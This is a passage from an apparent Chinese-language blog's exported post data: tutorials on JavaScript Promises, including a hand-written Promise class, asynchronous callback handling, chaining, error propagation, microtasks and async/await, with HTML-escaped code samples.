1234567891011121314151617181920Promise.all = function (promises) &#123; return new Promise((resolve, reject) =&gt; &#123; //声明变量 let count = 0; let arr = []; //遍历 for (let i = 0; i &lt; promises.length; i++) &#123; promises[i].then(v =&gt; &#123; // 在这就可以得知当前对象的状态是成功 count++; arr[i] = v; if (count === promises.length) &#123; resolve(arr); // 修改状态 &#125; &#125;, r =&gt; &#123; reject(r); &#125;); &#125; &#125;);&#125; 将当前promise对象成功的结果存入到数组这一步，不能用arr.push(v)！这是因为这几个promise执行的顺序可能有先有后，所以不一定是按照p1 - p2 - p3的先后顺序压入数组的。 Promise.race 封装直接谁先执行就返回谁的运行结果即可。总之就是无论返回的是谁，直接resolve()或者rejected()。一样得先遍历。注意是改变返回结果的状态为成功&#x2F;失败。 html调用： 123456789let p1 = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); &#125;, 1000)&#125;)let p2 = Promise.resolve(&#x27;Success&#x27;);// let p2 = Promise.reject(&#x27;Success&#x27;);let p3 = Promise.resolve(&#x27;Oh Yeah&#x27;);//调用 race 方法let result = Promise.race([p1, p2, p3]);console.log(result); promise.js修改与实现： 12345678910111213Promise.race = function (promises) &#123; return new Promise((resolve, reject) =&gt; &#123; for (let i = 0; i &lt; promises.length; i++) &#123; promises[i].then(v =&gt; &#123; //修改返回对象的状态为 『成功』 resolve(v); &#125;, r =&gt; &#123; //修改返回对象的状态为 『失败』 reject(r); &#125;) &#125; &#125;);&#125; then方法指定的回调函数「异步执行」如果我们运行下面代码，正确顺序是：111 --&gt; 333 --&gt;444： 123456789101112let p1 = new Promise((resolve, reject) =&gt; &#123; reject(&#x27;OK&#x27;); console.log(111); &#125;); p1.then(value =&gt; &#123; console.log(222); &#125;, reason =&gt; &#123; console.log(444); &#125;); console.log(333); 这是因为then()指定的回调函数是异步执行的，需要等所有同步代码执行完成后才能执行。但当运行之前封装的 Promise 代码时，结果却是：111 --&gt; 444 --&gt; 333。需要将我们自己写的的then()方法变成异步方法。修改的位置应该在真正去调用回调函数的地方，then()中有两处，（同步执行的情况）promise的定义中有两处（异步执行的情况，需要进队列）。 只要在以下四处地方的回调函数调用外层包裹一层定时器（不一定是定时器，开启异步即可），即可做到异步操作： 123456789101112131415161718192021222324252627282930313233343536373839function Promise(executor) &#123; // ... function resolve(data) &#123; setTimeout(() =&gt; &#123; // ----------------------修改1 self.callbacks.forEach(item =&gt; &#123; item.onResolved(data); &#125;); &#125;); &#125; function reject(data) &#123; setTimeout(() =&gt; &#123; // ----------------------修改2 self.callbacks.forEach(item =&gt; &#123; item.onRejected(data); &#125;); &#125;); &#125; // ...&#125;Promise.prototype.then = function (onResolved, onRejected) &#123; // ... return new Promise((resolve, reject) =&gt; &#123; // ... /* 修改前代码 if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; callback(onResolved); &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; callback(onRejected); &#125; */ if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; setTimeout(() =&gt; &#123; // ----------------------修改3 callback(onResolved); &#125;); &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; setTimeout(() =&gt; &#123; // ----------------------修改4 callback(onRejected); &#125;); &#125; &#125;)&#125; 相关原理参照js事件循环机制、宏任务与微任务。 封装成class大概框架为： 12345678910111213141516171819202122232425262728293031323334353637class Promise&#123; // 构造方法 constructor(executor)&#123; // 放之前function Promise(executor) &#123;&#125;内的东西 &#125; // then方法封装 then(onResolved,onRejected)&#123; // 放之前Promise.prototype.then = function (onResolved, onRejected) &#123;&#125;内的东西 &#125; // catch方法 catch(onRejected)&#123; // 放之前Promise.prototype.catch = function (onRejected) &#123;&#125;内的东西 &#125; // resolve方法:注意这个方法不属于实例对象，它属于这个类 // 所以需要用static关键字表明这是一个静态成员，属于类而不属于实例对象 static resolve(value) &#123; // 放之前Promise.resolve = function (value) &#123;&#125;内的东西 &#125; // reject方法 static reject(reason) &#123; // 放之前Promise.reject = function (value) &#123;&#125;内的东西 &#125; // all 方法 static all(promises) &#123; // 放之前Promise.all = function (value) &#123;&#125;内的东西 &#125; //race 方法 static race(promises) &#123; // 放之前Promise.race = function (value) &#123;&#125;内的东西 &#125;&#125; 下面为.html文件中的部分测试代码： 1234567891011121314let p1 = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; // resolve(&quot;OK&quot;); reject(&quot;Error&quot;); &#125;)&#125;);p1.then(value =&gt; &#123; console.log(value);&#125;, reason =&gt; &#123; console.warn(reason);&#125;);console.log(Promise.resolve(&#x27;OK&#x27;));","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"手写promise完整代码","slug":"手写promise完整代码","date":"2022-11-01T03:29:40.000Z","updated":"2022-11-01T03:29:40.000Z","comments":true,"path":"2022/11/01/手写promise完整代码/","link":"","permalink":"https://avalooooooon.github.io/2022/11/01/%E6%89%8B%E5%86%99promise%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81/","excerpt":"给出自定义的promise.js文件。在.html文件中通过&lt;script src=&quot;./promise.js&quot;&gt;&lt;/script&gt;引入即可实现完整功能。","text":"给出自定义的promise.js文件。在.html文件中通过&lt;script src=&quot;./promise.js&quot;&gt;&lt;/script&gt;引入即可实现完整功能。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175class Promise &#123; // 构造方法 constructor(executor) &#123; // 添加属性 this.PromiseState = &#x27;pending&#x27;; this.PromiseResult = null; this.callbacks = []; // 保存实例对象的 this 的值（也可用箭头函数实现） const self = this; // resolve 函数 function resolve(data) &#123; //判断状态 if (self.PromiseState !== &#x27;pending&#x27;) return; // 1. 修改对象的状态 (promiseState) self.PromiseState = &#x27;fulfilled&#x27;; // resolved // 2. 设置对象结果值 (promiseResult) self.PromiseResult = data; // 调用成功的回调函数 setTimeout(() =&gt; &#123; self.callbacks.forEach(item =&gt; &#123; item.onResolved(data); &#125;) &#125;) &#125; // reject 函数 function reject(data) &#123; //判断状态 if (self.PromiseState !== &#x27;pending&#x27;) return; // 1. 修改对象的状态 (promiseState) self.PromiseState = &#x27;rejected&#x27;; // // 2. 设置对象结果值 (promiseResult) self.PromiseResult = data; // 调用失败的回调函数 setTimeout(() =&gt; &#123; self.callbacks.forEach(item =&gt; &#123; item.onRejected(data); &#125;) &#125;) &#125; try &#123; // 同步调用『执行器函数』 executor(resolve, reject); &#125; catch (e) &#123; // 修改promise对象状态为『失败』 reject(e); &#125; &#125; // then方法封装 then(onResolved, onRejected) &#123; const self = this; // 判断回调函数参数 if (typeof onRejected !== &#x27;function&#x27;) &#123; onRejected = reason =&gt; &#123; throw reason &#125; &#125; if (typeof onResolved !== &#x27;function&#x27;) &#123; onResolved = value =&gt; value; // 是 value =&gt; &#123;return value&#125;的简写。 &#125; return new Promise((resolve, reject) =&gt; &#123; // 封装函数 function callback(type) &#123; try &#123; // 获取回调函数的执行结果 let result = type(self.PromiseResult); // 判断 if (result instanceof Promise) &#123; result.then(v =&gt; &#123; resolve(v) &#125;, r =&gt; &#123; reject(r) &#125;) &#125; else &#123; // 返回的对象状态为成功 resolve(result) &#125; &#125; catch (e) &#123; reject(e) &#125; &#125; // 调用回调函数 if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; setTimeout(() =&gt; &#123; callback(onResolved) &#125;) &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; setTimeout(() =&gt; &#123; callback(onRejected) &#125;) &#125; // 判断 pending 状态 if (this.PromiseState === &#x27;pending&#x27;) &#123; // 保存回调函数 this.callbacks.push(&#123; onResolved: function () &#123; callback(onResolved) &#125;, onRejected: function () &#123; callback(onRejected) &#125;, &#125;); &#125; &#125;) &#125; // catch方法 catch(onRejected) &#123; return this.then(undefined, onRejected) &#125; // resolve方法 static resolve(value) &#123; // 返回promise对象 return new Promise((resolve, reject) =&gt; &#123; if (value instanceof Promise) &#123; value.then(v =&gt; &#123; resolve(v); &#125;, r =&gt; &#123; reject(r) &#125;) &#125; else &#123; // 状态设置为成功 resolve(value); &#125; &#125;) &#125; // 添加reject方法 static reject(reason) &#123; return new Promise((resolve, reject) =&gt; &#123; reject(reason) &#125;) &#125; // 添加 all 方法 static all(promises) &#123; return new Promise((resolve, reject) =&gt; &#123; //声明变量 let count = 0; let arr = []; //遍历 for (let i = 0; i &lt; promises.length; i++) &#123; promises[i].then(v =&gt; &#123; // 在这就可以得知当前对象的状态是成功 count++; arr[i] = v; if (count === promises.length) &#123; resolve(arr); // 修改状态 &#125; &#125;, r =&gt; &#123; reject(r); &#125;); &#125; &#125;); &#125; //添加 race 方法 static race(promises) &#123; return new Promise((resolve, reject) =&gt; &#123; for (let i = 0; i &lt; promises.length; i++) &#123; promises[i].then(v =&gt; &#123; //修改返回对象的状态为 『成功』 resolve(v); &#125;, r =&gt; &#123; //修改返回对象的状态为 『失败』 reject(r); &#125;) &#125; &#125;); &#125;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"Promise教程","slug":"Promise教程","date":"2022-10-25T09:02:31.000Z","updated":"2022-10-25T09:02:31.000Z","comments":true,"path":"2022/10/25/Promise教程/","link":"","permalink":"https://avalooooooon.github.io/2022/10/25/Promise%E6%95%99%E7%A8%8B/","excerpt":"","text":"Productionpromise是什么ES6引入的异步编程的新解决方案（旧方案是单纯使用回调函数）。语法上看，promise是一个构造函数；功能上，promise是一个对象，通常用来封装一个异步任务，提供承诺结果（其成功&#x2F;失败）。 常见的异步编程：fs文件操作：require(&#39;fs&#39;).readFile(&#39;./index.html&#39;,(err,data)=&gt;&#123;&#125;)mysql&#x2F;mangodb等数据库操作AJAX(jquery为例)：$.get(&#39;/server&#39;,(data)=&gt;&#123;&#125;)定时器：setTimeout(()=&gt;&#123;&#125;,2000) 通俗讲，Promise是一个对未来事情的许诺、承诺，承诺不一定能完成，但是无论是否能完成都会有一个结果。Promise 用来预定一个不一定能完成的任务，要么成功，要么失败。 promise的状态「PromiseState」 状态是promise实例对象的一个属性：PromiseState。 Promise的状态如下，作为promise参数函数的参数时，它们自己是函数类型的数据： pending：未决定的（正在做。。。） resolved&#x2F;fullfilled：成功（完成这个承诺）。异步任务成功时调用。 rejected：失败（承诺没完成，失败了）。异步任务失败时调用。 使promise状态改变的方法和结果如下，只有这两种可能，一个promise对象的状态只能改变一次： 当前是pending ，变为 resolved： a. 通过 resolve(value) 当前是pending ，变为 rejected a. 通过reject(reason) b. 通过抛出异常，可以使用throw关键字，如throw &quot;出现错误&quot; 状态改变只有这 2 种, 且一个 promise 对象只能改变一次。无论变为成功还是失败, 都会有一个结果数据 。成功的结果数据一般称为 value, 失败的结果数据一般称为 reason。 promise对象的值「PromiseResult」 是promise实例对象的另一个属性：PromiseResult。 保存的是异步任务成功或失败的结果。有两个函数可以修改这个值： resolve() reject() 就是new Promise((resolve, reject) =&gt; &#123;&#125;中的resolve和reject。 特点和优缺点优势： 支持链式调用，可以解决回调地狱问题。 回调地狱：回调函数嵌套调用，外部回调函数异步执行的结果是套在内部的回调函数执行的条件。即一层一层的嵌套，上一个方法拿到数据后在执行下一个。回调地狱的缺点：不便于阅读 + 不便于异常处理 不过promise只是简单的改变格式，并没有彻底解决上面的问题。真正解决要利用promise再加上await和async关键字实现异步传同步。 指定回调函数的方式更加灵活 之前是在启动异步任务之前就必须把回调函数绑定好 promise可以：启动异步任务&#x3D;&gt;返回promise对象&#x3D;&gt;给promise对象绑定回调函数（甚至可以在异步任务结束后指定多个） 特点: 对象的状态不受外界影响。Promise对象代表一个异步操作，有三种状态：Pending（进行中）、Resolved（已完成，又称Fulfilled）和Rejected（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。 一旦状态改变，就不会再变，任何时候都可以得到这个结果。Promise对象的状态改变，只有两种可能：从Pending变为Resolved和从Pending变为Rejected。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果。就算改变已经发生了，你再对Promise对象添加回调函数，也会立即得到这个结果。 缺点: 无法取消Promise，一旦新建它就会立即执行，无法中途取消。和一般的对象不一样，无需调用。 如果不设置回调函数，Promise内部抛出的错误，不会反应到外部。 当处于Pending状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成） 它的小伙伴：then()Promise实例生成以后，可以用 then()方法分别指定resolved状态和rejected状态的回调函数。 12345promise.then(function(value) &#123; // (value)=&gt;&#123;&#125; // 当promise状态返回为resolve 时会执行的回调函数 &#125;, function(error) &#123; // (reason)=&gt;&#123;&#125; // 当promise状态返回为rejected 时会执行的回调函数&#125;); promise的then()方法可以接受两个回调函数作为参数。第一个回调函数是Promise对象的状态变为resolved时调用，第二个回调函数是Promise对象的状态变为rejected时调用。第二个函数是可选的，不一定要提供。这两个函数都接受Promise对象传出的值作为参数。 如果形参只有一个，使用箭头函数时可以简写，不要小括号，即可以将(value)=&gt;&#123;&#125;写作value =&gt;&#123;&#125;。 基本使用方法示例 使用 promise 封装基于定时器的异步 123456789101112131415161718192021222324252627function doDelay(time) &#123; // 1. 创建 promise 对象(pending 状态), 指定执行器函数 return new Promise((resolve, reject) =&gt; &#123; // 2. 在执行器函数中启动异步任务 console.log(&#x27;启动异步任务&#x27;) setTimeout(() =&gt; &#123; console.log(&#x27;延迟任务开始执行...&#x27;) const time = Date.now() // 假设: 时间为奇数代表成功, 为偶数代表失败 if (time % 2 === 1) &#123; // 成功了 // 3. 1. 如果成功了, 调用 resolve()并传入成功的 value resolve(&#x27;成功的数据 &#x27; + time) &#125; else &#123; // 失败了 // 3.2. 如果失败了, 调用 reject()并传入失败的 reason reject(&#x27;失败的数据 &#x27; + time) &#125; &#125;, time) &#125;)&#125;const promise = doDelay(2000)promise.then(// promise指定成功或失败的回调函数来获取成功的value或失败的reason (value) =&gt; &#123;// 成功的回调函数 onResolved, 得到成功的value console.log(&#x27;成功的value: &#x27;, value) &#125;, (reason) =&gt; &#123; // 失败的回调函数 onRejected, 得到失败的reason console.log(&#x27;失败的reason: &#x27;, reason) &#125;,) fs模块使用promise1234567891011121314151617181920212223242526272829303132333435const fs = require(&#x27;fs&#x27;);//回调函数 形式----------------------------------------------------fs.readFile(&#x27;./resource/content.txt&#x27;, (err, data) =&gt; &#123; // 如果出错 则抛出错误 if (err) throw err; //输出文件内容 console.log(data.toString());&#125;);//Promise 形式-----------------------------------------------------------/** * 封装一个函数 mineReadFile 读取文件内容 * 参数: path 文件路径 * 返回: promise 对象 */function mineReadFile(path) &#123; return new Promise((resolve, reject) =&gt; &#123; //读取文件 require(&#x27;fs&#x27;).readFile(path, (err, data) =&gt; &#123; //判断 if (err) reject(err); //成功 resolve(data); &#125;); &#125;);&#125;mineReadFile(&#x27;./resource/content.txt&#x27;) .then(value =&gt; &#123; //输出文件内容 console.log(value.toString()); &#125;, reason =&gt; &#123; console.log(reason); &#125;); 使用util.promisify()方法进行风格转化想使用promise方法时，不用每个函数都要去手动封装，而可以借助util.promisify()方法将原来的回调函数风格的方法转变成promise风格。也就是把这个普通异步函数的方法给它，它帮我们转化成promise风格的。传入一个遵循常见的错误优先的回调风格的函数（即以(err,value)=...&gt;回调作为最后一个参数），并返回一个返回promise的版本。 123456789//引入 util 模块const util = require(&#x27;util&#x27;);//引入 fs 模块const fs = require(&#x27;fs&#x27;);//返回一个新的函数let mineReadFile = util.promisify(fs.readFile);mineReadFile(&#x27;./resource/content.txt&#x27;).then(value =&gt; &#123; console.log(value.toString());&#125;); 常用APIPromise构造函数Promise构造函数new Promise()——Promise(excutor)&#123;&#125;通过new关键字使用。a. Promise的参数executor函数:称为执行器函数——(resolve, reject) =&gt; &#123;&#125;b. resolve函数: 内部定义成功时调用——value =&gt; &#123;&#125;c. reject函数: 内部定义失败时调用——reason =&gt; &#123;&#125; 说明: executor 会在 Promise 内部立即同步调用，也就是代码let p = new Promise((resolve,reject)=&gt;&#123;&#125;执行到new时，executor函数会立即执行。异步操作在执行器中执行，换句话说就是Promise支持同步也支持异步操作。 then方法Promise.prototype.then()方法——(onResolved, onRejected) =&gt; &#123;&#125;a. onResolved函数: 成功的回调函数——(value) =&gt; &#123;&#125;b. onRejected函数: 失败的回调函数——(reason) =&gt; &#123;&#125; 说明: 指定用于得到成功value值的成功回调和用于得到失败reason值的失败回调，返回一个新的promise对象。 关于then()方法的返回结果，是由它指定的回调函数的执行结果决定的： 回调函数返回了一个非promise类型的数据（number、string、undefined…），then()的返回结果就是一个成功的promise，它的Result就是回调函数返回的东西； 回调函数返回的是一个promise，那这个返回的promise就决定了then()返回的promise。 catch方法Promise.prototype.catch()方法——(onRejected) =&gt; &#123;&#125;只能指定失败的回调，不能指定成功的回调。a. onRejected函数: 失败的回调函数——(reason) =&gt; &#123;&#125; 说明: then()的语法糖，相当于: then(undefined, onRejected) b. 异常穿透使用:当运行到最后，没被处理的所有异常错误都会进入这个方法的回调函数中。 resolve方法Promise.resolve()方法——(value) =&gt; &#123;&#125;和.then()和.catch()不同的是，.resolve()方法不是属于实例对象的，而是属于promise这个函数对象的。它的作用就是快速得到一个promise对象，而且还能封装一个值value，将这个值转化为promise对象。a. value: 成功的数据或 promise 对象，是PromiseResult的值。 说明: 返回一个成功&#x2F;失败的promise 对象，即PromiseState是成功&#x2F;失败。直接改变promise状态为fulfilled或rejected。如果传入的参数为非Promise类型的对象（number、string、boolean、undefined等），则返回的结果为成功promise对象；如果参数为Promise对象，则参数的结果决定了resolve的结果。 123let p = Promise.reject(new Promise((resolve, reject) =&gt; &#123;resolve(&#x27;OK&#x27;); &#125;)); console.log(p); reject方法Promise.reject()方法: (reason) =&gt; &#123;&#125;类似Promise.resolve()。a. reason: 失败的原因，是PromiseResult的值。 说明: 返回一个失败的 promise 对象，即PromiseState是失败。直接改变promise状态为rejected。代码示例同上。不管传入的是什么类型，都是失败的。 all方法Promise.all()方法: (promises) =&gt; &#123;&#125;a. promises: 包含 n 个 promise 的数组 说明: 返回一个新的 promise，只有所有的 promise 都成功才成功；只要有一个失败就直接失败。返回的结果：如果最终成功，返回值就是所有的promise对象的成功结果组成的数组；最终失败，返回的就是第一个失败的那个promise对象的失败结果。 12345let p1 = new Promise((resolve, reject) =&gt; &#123; resolve(&#x27;成功&#x27;); &#125;)let p2 = Promise.reject(&#x27;错误错误错误&#x27;);let p3 = Promise.resolve(&#x27;也是成功&#x27;)const result = Promise.all([p1, p2, p3]);console.log(result); race方法Promise.race()方法: (promises) =&gt; &#123;&#125;使用场景：ajax请求和超时回调，ajax在超时回调执行前完成，显示回调结果，否则显示请求超时。a. promises: 包含 n 个 promise 的数组 说明: 返回一个新的 promise，第一个完成的 promise 的结果状态就是最终的结果状态。如p1延时，开启了异步，内部正常是同步进行，所以p2&gt;p3&gt;p1，结果就是P2。 12345678910let p1 = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); &#125;, 1000);&#125;)let p2 = Promise.resolve(&#x27;Success&#x27;);let p3 = Promise.resolve(&#x27;Oh Yeah&#x27;);//调用const result = Promise.race([p1, p2, p3]);console.log(result); Promise的几个关键问题一个 promise 指定多个成功&#x2F;失败回调函数，都会调用吗?当 promise 改变为对应状态时都会调用。改变状态后，多个回调函数都会调用，并不会自动停止。 12345let p = new Promise((resolve, reject) =&gt; &#123; resolve(&#x27;OK&#x27;);&#125;);//指定回调1p.then(value =&gt; &#123; console.log(value); &#125;);//指定回调2p.then(value =&gt; &#123; alert(value);&#125;); 改变 promise 状态（通过resolve、reject、throw）和指定回调函数（通过then、catch）的执行顺序，谁先谁后?简单举个例子：在promise代码运行时，是resolve()改变状态先执行，还是then()指定回调先执行？ 都有可能, 正常情况下是先指定回调再改变状态, 但也可以先改状态再指定回调 先指定回调再改变状态(异步)：先指定回调–&gt; 再改变状态 –&gt;改变状态后才进入异步队列执行回调函数 先改状态再指定回调(同步)：改变状态 –&gt;指定回调，并马上执行回调 如何先改状态再指定回调? 注意，指定 并不是 执行！指定：在then中，放入成功或者失败状态，对应状态有特定的回调函数，对应关系，但是没实施 在执行器中直接调用 resolve()/reject()，即不使用定时器等方法，执行器内直接同步操作 延迟调用then()，即在.then()这个方法外再包一层（如延时器） 什么时候才能得到数据? 这问题其实就等于在问回调函数什么时候执行。 如果先指定的回调，那当状态发生改变后，再去调用成功或失败的回调函数，得到数据 如果先改变的状态（立即调resolve()）, 那当指定回调（then()调用）时，就会立即调用回调函数得到数据。 总之就是先改变状态；要是回调还没指定好，状态发生改变就去指定回调，回调要是指定好了的话就立即调用。 1234567let p = new Promise((resolve, reject) =&gt; &#123; //1.异步写法,这样写会先指定回调,再改变状态 setTimeout(() =&gt; &#123;resolve(&#x27;OK&#x27;); &#125;, 1000); //2.这是同步写法,这样写会先改变状态,再指定回调 resolve(&#x27;OK&#x27;); &#125;);p.then(value =&gt; &#123;console.log(value);&#125;, reason =&gt; &#123;&#125;) 个人理解–结合源码 源码中，promise的状态是通过一个默认为padding的变量进行判断,所以当你resolve&#x2F;reject延时(异步导致当then加载时,状态还未修改)后,这时直接进行p.then()会发现,目前状态还是进行中,所以只是这样导致只有同步操作才能成功. 所以promise将传入的回调函数拷贝到promise对象实例上,然后在resolve&#x2F;reject的执行过程中再进行调用,达到异步的目的 具体代码实现看下方自定义promise。 promise.then()返回的新promise的结果和状态由什么决定? 由 then()指定的回调函数执行的结果决定 详细表达: 如果抛出异常， 新promise变为rejected, reason为抛出的异常 如果返回的是非promise的任意值， 新promise变为resolved，value为返回的值 如果返回的是另一个新promise， 此promise的结果就会成为新promise的结果 123456789101112131415161718let p = new Promise((resolve, reject) =&gt; &#123; resolve(&#x27;ok&#x27;);&#125;);//执行 then 方法let result = p.then(value =&gt; &#123; console.log(value); // 1. 抛出错误 ,变为 rejected throw &#x27;出了问题&#x27;; // 2. 返回结果是非 Promise 类型的对象,新 promise 变为 resolved return 521; // 3. 返回结果是 Promise 对象,此 promise 的结果就会成为新 promise 的结果 return new Promise((resolve, reject) =&gt; &#123; // resolve(&#x27;success&#x27;); reject(&#x27;error&#x27;); &#125;);&#125;, reason =&gt; &#123; console.warn(reason);&#125;); promise 如何串连多个操作任务? promise 的then()返回一个新的 promise，可以开成then()的链式调用 通过then()的链式调用串连多个同步&#x2F;异步任务，这样就能用then()将多个同步或异步操作串联成一个同步队列。 12345678910111213141516let p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); &#125;, 1000);&#125;);let result = p.then(value =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; resolve(&quot;success&quot;); &#125;);&#125;).then(value =&gt; &#123; console.log(value, &quot;111&quot;);&#125;).then(value =&gt; &#123; console.log(value, &quot;222&quot;);&#125;)console.log(result) 这段代码的输出为： 123Promise &#123; &lt;pending&gt; &#125;success 111undefined 222 最后一个then之所以输出undefined，因为上一层的resolve没有指定value。上一层的then返回的是一个promise，这个promise的状态由它指定的回调函数的返回值决定；回调函数也是函数，函数有返回值，然而这里没写返回值，返回的是undefined。所以成功的结果是上一个的返回值，返回undefined，结果就是undefined。 promise 异常传透? 当使用 promise 的 then 链式调用时，可以在 最后 指定失败的回调 前面任何操作出了异常，都会传到最后失败的回调中处理 异常穿透的原因：上面的一串then()都没有对异常的处理，所以每个then的返回值就是上一个promise的值，所以最后catch了。 之前我们都是在每个then()的第二个回调函数中进行err处理；其实也可以利用异常穿透特性，到最后用catch去承接统一处理。两者一起用时，只有前者会生效（因为err已经将其处理，就不会再往下穿透）而走不到后面的catch。 在每个.then()中可以将数据再次传出给下一个then()。 12345678910111213141516let p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); // reject(&#x27;error!!error!!&#x27;) &#125;, 1000);&#125;);p.then(value =&gt; &#123; // console.log(&#x27;@@@@@@@@&#x27;); throw &#x27;我这里失败啦&#x27;&#125;).then(value =&gt; &#123; console.log(value, &quot;222&quot;);&#125;).then(value =&gt; &#123; console.log(value, &quot;333&quot;);&#125;).catch(reason =&gt; &#123; console.log(reason, &quot;catchcatch&quot;)&#125;) 这段代码的输出为： 1我这里失败啦 catchcatch 中断 promise 链? 含义：当使用 promise 的then()链式调用时，在中间中断，不再调用后面的回调函数 「有且只有这一种办法」： 在回调函数中返回一个 pendding 状态的promise 对象。 在关键问题：“一个 promise 指定多个成功&#x2F;失败回调函数, 都会调用吗？”中可以得知，当promise状态改变时，他的链式调用都会生效。那如果有这样一个实际需求：有5个then()，但其中有条件判断，如当符合或者不符合第三个then条件时，要直接中断链式调用，不再走下面的then，该如何？就是中断 promise 链的问题。 12345678910111213141516let p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); &#125;, 1000);&#125;);p.then(value =&gt; &#123; console.log(&#x27;@@@@@@@@&#x27;); // 有且只有这一个办法！ return new Promise(() =&gt; &#123; &#125;)&#125;).then(value =&gt; &#123; console.log(222);&#125;).then(value =&gt; &#123; console.log(333);&#125;).catch(reason =&gt; &#123; console.log(reason, &quot;catchcatch&quot;)&#125;) 这段代码的输出为： 1@@@@@@@@ 注意，then里的回调函数只会在状态改变后执行；状态不改变它就不会执行。 调用resolve或reject终结 Promise 的参数函数?调用resolve或reject并不会终结 Promise 的参数函数的执行。 12345678new Promise((resolve, reject) =&gt; &#123; resolve(1); console.log(2);&#125;).then(r =&gt; &#123; console.log(r);&#125;);// 2// 1 上面代码中，调用resolve(1)后，后面的console.log(2)还是会执行，并且会首先打印出来。这是因为立即resolved的Promise是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务。 接上：建议在修改状态函数前加return一般来说，调用resolve或reject后，Promise 的使命就完成了，后继操作应该放到then里面，而不应该直接写在resolve或reject的后面。所以，最好在它们前面加上return语句，这样就不会有意外。 12345new Promise((resolve, reject) =&gt; &#123; return resolve(1); // 后面的语句不会执行 console.log(2);&#125;) 宏任务与微任务考虑下面代码段的输出是什么： 12345678910let promise = new Promise(function (resolve, reject) &#123; console.log(&#x27;Promise&#x27;); resolve();&#125;);promise.then(function () &#123; console.log(&#x27;resolved.&#x27;);&#125;);console.log(&#x27;Hi!&#x27;); 这段代码的输出为： 123PromiseHi!resolved. 可以发现，明明then是在 Hi 前面，却最后打印。上面代码中，Promise 新建后立即执行，所以首先输出的是Promise。然后，then()方法指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以resolved最后输出。实际上，这个运行结果相关知识点是 [ 宏任务与微任务 ] 。这里可以先初步理解为: JS是单线程的，从上往下运行，在声明 Promise 时实际上已经执行到了内部方法 为何resolve()运行后没有立即打印? a. JS中用来存储待执行回调函数的队列包含2个不同特定的列队 宏队列：用来保存待执行的宏任务(回调)，比如：定时器回调&#x2F;ajax回调&#x2F;dom事件回调 微队列：用来保存待执行的微任务(回调)，比如：Promise的回调&#x2F;muntation回调 b. JS执行时会区别这2个队列 JS执行引擎首先必须执行所有的初始化同步任务代码 每次准备取出第一个宏任务执行前，都要将所有的微任务一个一个取出来执行 async与await Promise&#x3D;&#x3D;&gt;异步 await&#x3D;&#x3D;&gt;异步转同步 await 可以理解为是 async wait 的简写。await 必须出现在 async 函数内部，不能单独使用。 await 后面可以跟任何JS表达式。虽然说 await 可以等很多类型的东西，但是它最主要的意图是用来等待 Promise 对象的状态被 resolved。如果 await的是 promise对象 ，会造成异步函数停止执行并且等待 promise 的解决，如果 等的是正常的表达式则立即执行 async&#x3D;&#x3D;&gt;同步转异步 方法体内部的某个表达式使用await修饰，那么这个方法体所属方法必须要用async关键字修饰。 所以使用awit方法会自动升级为异步方法。 async函数用来标记一个函数，实现async函数；这个函数的返回结果是promise对象，这个promise对象的结果由async函数执行的返回值决定。 style123456789101112131415161718 &gt; 返回了一个非```promise```类型的数据（number、string、undefined...），```async()```的返回结果就是一个成功的promise，它的Result就是回调函数返回的东西； &gt; 返回的是一个promise，那这个返回的```promise```就决定了```async()```返回的promise。.html文件中的测试代码如下：```javascriptasync function main() &#123; // 1. 如果返回值是非Promise类型的数据 // return 521 // 2. 如果返回值是Promise对象 // return new Promise((resolve,reject) =&gt; &#123; // resolve(&#x27;OK&#x27;) // &#125;) // 3. 抛出异常 throw &quot;Oh No&quot;&#125;let result = main();console.log(result) await表达式 await右侧的表达式一般为promise对象，但也可以是其他值 如果表达式是promise对象，await返回的是promise成功的** 值 ** 如果表达式是其它值，直接将此值作为await的返回值 注意 await 必须写在 async 函数中! 但async函数中可以没有await。 如果await的promise失败了就会抛出异常，需要通过try...catch捕获处理。 .html文件中的测试代码如下： 123456789101112131415161718async function main() &#123; let p = new Promise((resolve, reject) =&gt; &#123; // resolve (&#x27;OK&#x27;); reject(&#x27;Error~~~~~~&#x27;) &#125;) // 1. 右侧是promise // let res = await p; // 2. 右侧是其它类型 // let res = await 20; // 3. 右侧的promise是失败的状态 try &#123; let res = await p; &#125; catch (e) &#123; console.log(e) &#125;&#125;main(); 